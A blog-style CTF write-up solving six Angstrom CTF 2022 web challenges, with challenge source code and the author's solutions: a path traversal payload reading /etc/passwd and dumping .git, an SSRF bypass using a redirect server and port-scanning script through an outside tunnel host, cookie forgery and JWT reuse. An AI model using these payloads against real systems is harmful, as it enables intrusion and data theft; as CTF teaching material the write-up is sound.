# Angstorm CTF 2022

## 7-Angstorm-CTF-2022-Writeup.md

It's been a long time since I did CTF, in this post I'd like to share you my writeups for Angstorm CTF. I joined Angstorm CTF after it's over, so I can take my time at each challenges, I will update this blog if I solve another challenges.

Fortunately for Angstorm CTF still can be accessed even though it's already over, so if you guys want to try it, you can access it here: https://2022.angstromctf.com/

## angstorm ctf

### Flash

#### Challenge Description

When you open the page, you will see a simple web page that consist of this words, if you look closely and wait, there'll be a fast change to this words, and I think that's the flag (based on the title).

First, I tried to see the javascript source:

```javascript
const _0x15c166=_0x43fe;(function(_0x20ab81,_0xdea176){const _0x3bb316=_0x43fe,_0x25fbaf=_0x20ab81();while(!![]){try{const _0x58137d=-parseInt(_0x3bb316(0xd4,'H3tY'))/0x1+-parseInt(_0x3bb316(0xd7,'nwZz'))/0x2+parseInt(_0x3bb316(0xe1,'%[Nl'))/0x3+parseInt(_0x3bb316(0xd6,'ub7C'))/0x4*(-parseInt(_0x3bb316(0xe7,'3RP4'))/0x5)+parseInt(_0x3bb316(0xd9,'9V4u'))/0x6+parseInt(_0x3bb316(0xdf,'t*r!'))/0x7*(parseInt(_0x3bb316(0xcf,'SMMO'))/0x8)+parseInt(_0x3bb316(0xe2,'6%rI'))/0x9*(parseInt(_0x3bb316(0xe6,'3RP4'))/0xa);if(_0x58137d===_0xdea176)break;else _0x25fbaf['push'](_0x25fbaf['shift']());}catch(_0xa016d7){_0x25fbaf['push'](_0x25fbaf['shift']());}}}(_0x4733,0xacded));const x=document['getElementById'](_0x15c166(0xe5,'q!!U'));setInterval(()=>{const _0x24a935=_0x15c166;Math[_0x24a935(0xd1,'&EwH')]()<0.05&&(x[_0x24a935(0xdc,'1WY2')]=[0x73,0x71,0x80,0x6e,0x89,0x81,0x84,0x41,0x41,0x70,0x8b,0x65,0x78,0x43,0x79,0x6f,0x65,0x80,0x7c,0x41,0x65,0x6e,0x78,0x40,0x81,0x7c,0x87][_0x24a935(0xdb,'H3tY')](_0x4cabe2=>String[_0x24a935(0xd8,'Ceiy')](_0x4cabe2-0xd^0x7))[_0x24a935(0xe0,'1WY2')](''),setTimeout(()=>x[_0x24a935(0xe3,'5HF&')]=_0x24a935(0xde,'($xo'),0xa));},0x64);function _0x43fe(_0x297222,_0x4c5119){const _0x47338c=_0x4733();return _0x43fe=function(_0x43fe0d,_0x2873da){_0x43fe0d=_0x43fe0d-0xcf;let _0x3df1f6=_0x47338c[_0x43fe0d];if(_0x43fe['jYleOi']===undefined){var _0x484b33=function(_0x406fee){const _0x292a9c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2734de='',_0x46bc7d='';for(let _0x89c327=0x0,_0x3d5185,_0x35bd82,_0x15d96e=0x0;_0x35bd82=_0x406fee['charAt'](_0x15d96e++);~_0x35bd82&&(_0x3d5185=_0x89c327%0x4?_0x3d5185*0x40+_0x35bd82:_0x35bd82,_0x89c327++%0x4)?_0x2734de+=String['fromCharCode'](0xff&_0x3d5185>>(-0x2*_0x89c327&0x6)):0x0){_0x35bd82=_0x292a9c['indexOf'](_0x35bd82);}for(let _0x4f3ab1=0x0,_0x2b4484=_0x2734de['length'];_0x4f3ab1<_0x2b4484;_0x4f3ab1++){_0x46bc7d+='%'+('00'+_0x2734de['charCodeAt'](_0x4f3ab1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x46bc7d);};const _0x4cabe2=function(_0x302eb2,_0x32783d){let _0x1fbce8=[],_0x4d57b4=0x0,_0x3fd440,_0x49491b='';_0x302eb2=_0x484b33(_0x302eb2);let _0x582ee5;for(_0x582ee5=0x0;_0x582ee5<0x100;_0x582ee5++){_0x1fbce8[_0x582ee5]=_0x582ee5;}for(_0x582ee5=0x0;_0x582ee5<0x100;_0x582ee5++){_0x4d57b4=(_0x4d57b4+_0x1fbce8[_0x582ee5]+_0x32783d['charCodeAt'](_0x582ee5%_0x32783d['length']))%0x100,_0x3fd440=_0x1fbce8[_0x582ee5],_0x1fbce8[_0x582ee5]=_0x1fbce8[_0x4d57b4],_0x1fbce8[_0x4d57b4]=_0x3fd440;}_0x582ee5=0x0,_0x4d57b4=0x0;for(let _0xbf0a0b=0x0;_0xbf0a0b<_0x302eb2['length'];_0xbf0a0b++){_0x582ee5=(_0x582ee5+0x1)%0x100,_0x4d57b4=(_0x4d57b4+_0x1fbce8[_0x582ee5])%0x100,_0x3fd440=_0x1fbce8[_0x582ee5],_0x1fbce8[_0x582ee5]=_0x1fbce8[_0x4d57b4],_0x1fbce8[_0x4d57b4]=_0x3fd440,_0x49491b+=String['fromCharCode'](_0x302eb2['charCodeAt'](_0xbf0a0b)^_0x1fbce8[(_0x1fbce8[_0x582ee5]+_0x1fbce8[_0x4d57b4])%0x100]);}return _0x49491b;};_0x43fe['aheYsv']=_0x4cabe2,_0x297222=arguments,_0x43fe['jYleOi']=!![];}const _0x2eb7bc=_0x47338c[0x0],_0xc73dee=_0x43fe0d+_0x2eb7bc,_0x2f959a=_0x297222[_0xc73dee];return!_0x2f959a?(_0x43fe['nusGzU']===undefined&&(_0x43fe['nusGzU']=!![]),_0x3df1f6=_0x43fe['aheYsv'](_0x3df1f6,_0x2873da),_0x297222[_0xc73dee]=_0x3df1f6):_0x3df1f6=_0x2f959a,_0x3df1f6;},_0x43fe(_0x297222,_0x4c5119);}function _0x4733(){const _0x562851=['j2nrWRvPfbn7','rKDEx8oeW6m','gSk4WQlcVCkOteCxq8kaiCo8','WPDTt8oVWPxcHNHdq8oWW5RcISob','W5z6vfL8Emk2fKyqh0S','ACobWQHmW63cTCksDrldUu7dSbm','ASofW6OnWQddTSoYFq','WPXcixtdT0PpW6fnbKLx','cSoyW41jW7bYWRrkW6BcGmoUWQm','Fe0yy2ZcQqFdHmoNe8oIAHe','W4zFo1iOuZVcMqXmW7Hu','WOOIfW','W63cLSobW5pcUYGnWP/cGW','FGhdPdFcVCk7aCkucmoIewi','FXD/WR0/lCk3WOhdPuuLnZVdOYjEo8k6CderudKhnZHw','lqdcImkwW5JcTCoi','W67cL8ogW5G','tSoTjd1mdSoXyfT7DKDq','WOpcSCo0WOtdJmkngSoPBNdcUfq','WPVcOHtdQ8oHWPaAxta','tttcLCkuWPZcPGxcJmkcWRxdTqZdHq','pSooW7hdGqu','WRxcUmkFgJpdVCoMW7Oo','WRBcVmkzxLtcISkDW6aujqdcUmke','gCktWR3dV8kaW7/dPrHCoCkLqmo9'];_0x4733=function(){return _0x562851;};return _0x4733();}
```

but I think the javascript is obfuscated, and I just think there'll be another way to do this, so I tried to debug on the javascript, but to no avail.

And, when I tried to inspect the DOM, we can actually add breakpoint to HTML element! (I didn't know that before), so we can set break point to this element:

After you set the breakpoint, when the js script hits and try to change this element, the browser will intercept that

You can just step over the debugger, and you'll know the flag!

### Auth Skip

#### Challenge Description

#### Source Code

```javascript
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.post("/login", (req, res) => {
    if (
        req.body.username !== "admin" ||
        req.body.password !== Math.random().toString()
    ) {
        res.status(401).type("text/plain").send("incorrect login");
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
    }
});

app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

#### How to solve

from the skimming of the codes, I happened to notice that this web use plaintext cookie, no authentication, just checking if the value of the cookie is admin, this one is very simple problem, I used an extension called EditThisCookie and tried to create/change cookie with key user and value admin, we'll get the flag after this.

### Crumbs

#### Challenge description

#### Source Code

```javascript
const express = require("express");
const crypto = require("crypto");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

const paths = {};
let curr = crypto.randomUUID();
let first = curr;

for (let i = 0; i < 1000; ++i) {
    paths[curr] = crypto.randomUUID();
    curr = paths[curr];
}

paths[curr] = "flag";

app.use(express.urlencoded({ extended: false }));

app.get("/:slug", (req, res) => {
    if (paths[req.params.slug] === "flag") {
        res.status(200).type("text/plain").send(flag);
    } else if (paths[req.params.slug]) {
        res.status(200)
            .type("text/plain")
            .send(`Go to ${paths[req.params.slug]}`);
    } else {
        res.status(200).type("text/plain").send("Broke the trail of crumbs...");
    }
});

app.get("/", (req, res) => {
    res.status(200).type("text/plain").send(`Go to ${first}`);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

#### How to solve

If you read the code, this challenge is very straightforward, you just have to follow the crumbs (links generated by the code, until you get the flag), of course you have to use automation, so this is my code for solving the challenge:

```python
import requests

r = requests.get("https://crumbs.web.actf.co")

while True:
    response = r.text
    print(response)
    response = response.split(" ")
    if len(response) == 3:
        r = requests.get("https://crumbs.web.actf.co/" + response[2])
    else:
        print(response)
        break
```

### Art-Gallery

#### Challenge Description

#### Source Code

```javascript
# source code
const express = require('express');
const path = require("path");

const app = express();
const port = Number(process.env.PORT) || 8080;

app.get("/gallery", (req, res) => {
    res.sendFile(path.join(__dirname, "images", req.query.member), (err) => {
        res.sendFile(path.join(__dirname, "error.html"))
    });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

#### How to Solve

Okay, from the description and also the source code of the challenge, we may already know that it will be related to git, maybe .git file. So, I also assume it will be File Inclusion.

Good point to see:

* /gallery endpoint seems not filtering the query parameter of request (member param)
* there's a mention of git, so it may be a .git files

So, at the start of the challenges, as usual we try to download/see default payload for LFI (Local File Inclusion) challenge: `../../../../etc/passwd`. And..... it downloaded a file.

when I opened it, it shows a legit `/etc/passwd` file:

we also can try if we can access another endpoint, we'll try .git/config (this is the easiest payload I can think)

```bash
~/S/a/art-gallery ❯❯❯ curl "https://art-gallery.web.actf.co/gallery?member=../.git/config"                    ✘ 130
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

Okay, so we can access .git, but because we can't download the whole .git folder, we have to do manually, or using a tool. We can use [git-dumper](https://github.com/arthaud/git-dumper).

```
# install git-dumper
pip3 install git-dumper

# use it to our target
python3 -m git_dumper "https://art-gallery.web.actf.co/gallery?member=../.git" .

# we use --patch in git log so we can see what's changed in the log, and we'll find the flag
git log --patch
```

### School Unblocker

#### Challenge Description

#### Source Code

```javascript
import express from "express";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath, URL } from "url";
import { resolve4 } from "dns/promises";

function isIpv4(str) {
    const chunks = str.split(".").map(x => parseInt(x, 10));
    return chunks.length === 4 && chunks.every(x => !isNaN(x) && x >= 0 && x < 256);
}

function isPublicIp(ip) {
    const chunks = ip.split(".").map(x => parseInt(x, 10));
    if ([127, 0, 10, 192].includes(chunks[0])) {
        return false;
    }
    if (chunks[0] == 172 && chunks[1] >= 16 && chunks[1] < 32) {
        return false;
    }
    return true;
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/proxy", async (req, res) => {
    try {
        const url = new URL(req.body.url);
        const originalHost = url.host;
        if (!isIpv4(url.hostname)) {
            const ips = await resolve4(url.hostname);
            // no dns rebinding today >:)
            url.hostname = ips[0];
        }
        if (!isPublicIp(url.hostname)) {
            res.type("text/html").send("<p>private ip contents redacted</p>");
        } else {
            const abort = new AbortController();
            setTimeout(() => abort.abort(), 3000);
            const resp = await fetch(url.toString(), {
                method: "POST",
                body: "ping=pong",
                headers: {
                    Host: originalHost,
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                signal: abort.signal,
            });
            res.type("text/html").send(await resp.text());
        }
    } catch (err) {
        res.status(400).type("text/plain").send("got error: " + err.message);
    }
});

// make flag accessible for local debugging purposes only
// also the nginx is at a private ip that isn't 127.0.0.1
// it's not that easy to get the flag :D
app.post("/flag", (req, res) => {
    if (!["127.0.0.1", "::ffff:127.0.0.1"].includes(req.socket.remoteAddress)) {
        res.status(400).type("text/plain").send("You don't get the flag!");
    } else {
        res.type("text/plain").send(flag);
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

#### How to solve

The easiest thing that I came to think when reading the source is: we can access `/flag` with the help of proxy that is available in `/proxy`.

But after reading the code, there seems a filter and condition that make this thing harder todo.

1. at /proxy endpoint we must specify a public ipv4
2. at /flag, we have to access it as a localhost (127.0.0.1), if not, we can't get the access

so with this condition is not easy task to just input `https://school-unblocker.web.actf.co/flag` or `127.0.0.1/flag` because those filtering, so we have to think another way to make it happen.



I got an idea to use redirect the request into another endpoint. First we have to supply the correct format for /proxy endpoint that is to supply public correct ipv4 url, then this fake server will listen, and send a response 308 to redirect to 0.0.0.0/flag so that the proxy will act behalf on this fake server.



this code is for fake server forwarder

```python
# forwarder.py
import http.server

class handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(308)
        self.send_header("Location", f"http://0.0.0.0:{self.path[1:]}/flag")
        self.end_headers()

with http.server.HTTPServer(("", 4444), handler) as server:
    server.serve_forever()
```

```python
# solve.py
import requests

url = "https://school-unblocker.web.actf.co/proxy"

# this is just a guess of the port used by the app
# it may be greater than 9000
port = 9000

while True:
    try:
        res = requests.post(url, data={"url": f"https://364c00d60af4b9.lhrtunnel.link/{port}"}) # redirect server
        text = res.text
        print(f"[{port}]\n{text}\n")
    except KeyboardInterrupt:
        exit()
    except:
        print(f"[{port}] error")
    finally:
        # you can customize the range really
        if port < 0:
            break
        port -= 1
```



So the flow will be like:

### Secure Vault

#### Challenge Description

#### Source Code

```javascript
const express = require("express");
const path = require("path");
const fs = require("fs");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// environment config
const port = Number(process.env.PORT) || 8080;
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

const userInfo = {};
const jwtKey = Math.random().toString();

class UserStore {
    constructor() {
        this.users = {};
        this.usernames = {};
    }

    insert(username, password) {
        const uid = Math.random().toString();
        this.users[uid] = {
            username,
            uid,
            password,
            vault: "put something here!",
            restricted: true,
        };
        this.usernames[username] = uid;
        return uid;
    }

    get(uid) {
        return this.users[uid] ?? {};
    }

    lookup(username) {
        return this.usernames[username];
    }

    remove(uid) {
        const user = this.get(uid);
        delete this.usernames[user.username];
        delete this.users[uid];
    }
}

function escape(str) {
    return str
        .replaceAll("&", "&amp;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&apos;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;");
}

const users = new UserStore();

app.use((req, res, next) => {
    try {
        res.locals.user = jwt.verify(req.cookies.token, jwtKey, {
            algorithms: ["HS256"],
        });
    } catch (err) {
        if (req.cookies.token) {
            res.clearCookie("token");
        }
    }
    next();
});

app.get("/", (req, res) => {
    res.type("text/html").send(fs.readFileSync(path.join(__dirname, res.locals.user ? "authed.html" : "index.html"), "utf8"));
});

app.post("/register", (req, res) => {
    if (
        !req.body.username ||
        !req.body.password ||
        req.body.username.length > 32 ||
        req.body.password.length > 32
    ) {
        res.redirect(
            "/?e=" +
                encodeURIComponent("Username and password must be 1-32 chars")
        );
        return;
    }
    if (users.lookup(req.body.username)) {
        res.redirect(
            "/?e=" +
                encodeURIComponent(
                    "Account already exists, please log in instead"
                )
        );
        return;
    }
    const uid = users.insert(req.body.username, req.body.password);
    res.cookie("token", jwt.sign({ uid }, jwtKey, { algorithm: "HS256" }));
    res.redirect("/");
});

app.post("/login", (req, res) => {
    const user = users.get(users.lookup(req.body.username));
    if (user && user.password === req.body.password) {
        res.cookie(
            "token",
            jwt.sign({ uid: user.uid }, jwtKey, { algorithm: "HS256" })
        );
        res.redirect("/");
    } else {
        res.redirect("/?e=" + encodeURIComponent("Invalid username/password"));
    }
});

app.post("/delete", (req, res) => {
    if (res.locals.user) {
        users.remove(res.locals.user.uid);
    }
    res.clearCookie("token");
    res.redirect("/");
});

app.get("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    const user = users.get(res.locals.user.uid);
    res.type("text/plain").send(user.restricted ? user.vault : flag);
});

app.post("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    if (!req.body.vault || req.body.vault.length > 2000) {
        res.redirect("/?e=" + encodeURIComponent("Vault must be 1-2000 chars"));
        return;
    }
    users.get(res.locals.user.uid).vault = req.body.vault;
    res.redirect("/");
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

#### How to Solve

The things that I notice from the source code:

1. The flag will be given if there's an account that has restricted value == false
2. res.locals.user is true/available if we supply correct jwt token that can be verified
3.

```
    const user = users.get(res.locals.user.uid);
    res.type("text/plain").send(user.restricted ? user.vault : flag);
```

if you take a look at this piece of codes, the checking of user.vault is very loose, if we specify an undefined user, it will send the flag!

```javascript
res.type("text/plain").send(user.restricted ? user.vault : flag);
res.type("text/plain").send(undefined ? user.vault : flag);  // <- undefined will be treated as false, and it will send you the flag!
```

4.

```
    get(uid) {
        return this.users[uid] ?? {};
    }
```

see this get function, this get function is very weird, as long as the jwt token valid, we can bypass the flag, and we can just send non existence uid and we will get {} as the return of get(uid), here {}.restricted will be undefined, and we can bypass the checking

But how to do that? how can we get the valid jwt token and also get undefined response?

trick: make an account, get its generated jwt, delete the account, reuse the token again.

why does it work?

1. We create a new account and it will generate valid jwt token for us (we can see in the cookies value).
2. Copy the value of jwt token
3. Delete the account, when we delete an account, we just remove its data from the users map, the jwt still valid!
4. Reuse the token that we copy on the 2nd step
5. Done

### References

* https://flaviocopes.com/python-http-server/
* http://localhost.run/docs/
